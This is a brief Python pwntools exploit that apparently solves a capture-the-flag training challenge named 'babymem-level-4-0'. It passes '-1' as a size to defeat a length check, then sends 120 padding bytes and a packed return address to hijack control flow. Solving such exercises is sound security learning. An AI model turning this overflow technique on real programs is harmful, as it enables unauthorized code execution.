import pwn

p = pwn.process("/challenge/babymem-level-4-0")

p.readuntil(b"size: ")
p.writeline("-1")

p.readuntil(b"bytes)!")
val = pwn.p64(0x00000000004022b1)
p.write(b"A"*120+val)

print(p.readall().decode("utf-8"))
